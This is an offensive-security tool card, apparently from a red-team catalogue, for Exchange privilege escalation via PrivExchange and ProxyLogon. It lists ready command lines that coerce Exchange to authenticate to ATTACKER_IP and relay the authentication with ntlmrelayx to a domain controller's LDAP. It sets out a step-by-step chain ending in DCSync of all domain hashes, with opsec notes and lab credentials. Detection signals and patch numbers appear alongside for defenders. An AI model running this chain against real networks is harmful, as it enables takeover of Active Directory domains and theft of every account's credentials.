---
name: Exchange PrivEsc (ProxyLogon/PrivExchange)
category: privilege-escalation
subcategories: [exchange, privexchange, proxylogon, eews-privilege]
tradecraft_tags: [exchange, privexchange, proxylogon, cve-2021-26855, ntlm-relay, ews, technique]
mitre_attack:
  - id: T1068
    name: Exploitation for Privilege Escalation
source:
  url: https://github.com/dirkjanm/PrivExchange
  license: MIT
  maintained: false
binary_type: python-script
binary_filename: privexchange.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  PrivExchange: Exchange server making a NTLM authentication to an attacker-controlled
  host (unusual outbound auth from Exchange). ProxyLogon: HTTP requests to Exchange's
  OWA/ECP interfaces generating specific error patterns. Exchange security team monitoring
  for abnormal EWS/subscription requests.
usage_examples:
  - description: PrivExchange — coerce Exchange to authenticate to relay host
    args: "privexchange.py -ah ATTACKER_IP -u jon.snow -p Password123 -d north.sevenkingdoms.local EXCHANGE_SERVER"
  - description: Relay coerced Exchange auth to LDAP for DCSync rights
    args: "ntlmrelayx.py -t ldap://DC01 --escalate-user attacker"
opsec_notes: |
  PrivExchange is patched (Nov 2019) but some environments may be unpatched. Exchange
  servers typically run as SYSTEM with high domain privileges (Exchange Windows Permissions
  group, often effectively DA). ProxyLogon (CVE-2021-26855) is a critical RCE — most
  internet-facing Exchange is patched but internal Exchange may be behind.
gotchas: |
  Both PrivExchange and ProxyLogon are patched vulnerabilities. Check Exchange version
  before attempting. Watson-equivalent for Exchange: `Get-ExchangeDiagnosticInfo -Server
  EXCHANGESERVER -Process EdgeTransport -Component HealthChecks -Settings VersionInfo`.
  PrivExchange relies on Exchange's EWS push subscription — requires Exchange to reach
  the attacker host.
related_ttps: [ntlmrelayx, responder, impacket-secretsdump, sharphound]
alternatives: [adcs-esc8-relay, petitpotam-coercion]
common_args:
  -ah:
    description: Attacker host for coerced authentication
    typical_values: ["ATTACKER_IP"]
    required: true
  -u:
    description: Domain username for authenticating to Exchange
    typical_values: ["jon.snow"]
    required: true
  -p:
    description: Password
    typical_values: ["Password123"]
  -d:
    description: Domain FQDN
    typical_values: ["north.sevenkingdoms.local"]
    required: true
last_updated: 2026-05-29
---

# Exchange PrivEsc (PrivExchange / ProxyLogon)

Two significant Exchange-specific privilege escalation techniques:

1. **PrivExchange** (2019, patched): Abuses Exchange's EWS push subscription to coerce the
   Exchange server (running as high-privilege service account) to authenticate to an
   attacker-controlled host for NTLM relay → DCSync rights.

2. **ProxyLogon** (CVE-2021-26855, patched): Pre-auth SSRF in Exchange that achieves
   remote code execution as SYSTEM on the Exchange server.

## PrivExchange Chain

```
1. Start ntlmrelayx targeting DC LDAP:
   ntlmrelayx.py -t ldap://DC01 --escalate-user attacker

2. Trigger Exchange EWS subscription:
   privexchange.py -ah ATTACKER_IP -u user -p pass -d domain EXCHANGE_SERVER

3. Exchange authenticates as EXCHANGE$ (high-privilege) to attacker
4. ntlmrelayx relays auth to LDAP → grants attacker DCSync rights
5. DCSync to get all domain hashes
```

## Why Exchange is High-Value

Exchange servers typically have:
- `WriteDACL` on the domain object (for legacy Exchange setup)
- Membership in `Exchange Windows Permissions` (can write DCSync ACLs)
- Often SYSTEM-level privileges on the server

## Patch Status
Both are patched (PrivExchange: KB4523171; ProxyLogon: KB5001779). Verify Exchange
version before attempting.
